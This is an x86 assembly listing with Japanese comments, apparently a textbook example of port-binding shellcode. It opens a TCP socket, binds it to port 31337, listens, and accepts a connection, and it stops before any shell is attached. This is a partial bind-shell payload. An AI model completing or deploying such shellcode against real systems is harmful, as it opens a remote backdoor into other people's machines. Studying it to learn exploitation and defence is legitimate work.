BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcallはシステムコール102番（0x66）
  pop eax
  cdq               ; DWORDのnullとして使用するためにedxをゼロクリアする
  xor ebx, ebx      ; ebxはsocketcallのタイプ
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; 引数の配列を生成する： { protocol = 0,
  push BYTE 0x1     ;   （逆順）               SOCK_STREAM = 1,
  push BYTE 0x2     ;                          AF_INET = 2 }
  mov ecx, esp      ; ecx = 引数の配列へのポインタ
  int 0x80          ; システムコールの後、eaxにはソケットファイル記述子が格納される

  mov esi, eax      ; 後で使用するためにソケットファイル記述子をesiに保存する

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall （システムコール102番）
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; sockaddr構造体を生成する：  INADDR_ANY = 0
  push WORD 0x697a  ;   （逆順）                  PORT = 31337
  push WORD bx      ;                             AF_INET = 2
  mov ecx, esp      ; ecx = サーバ構造体へのポインタ
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = 引数の配列
  int 0x80          ; eax = 0 （成功時）

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall （システムコール102番）
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = 引数の配列
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall （システムコール102番）
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = 引数の配列
  int 0x80          ; eax = 接続されたソケットファイル記述子
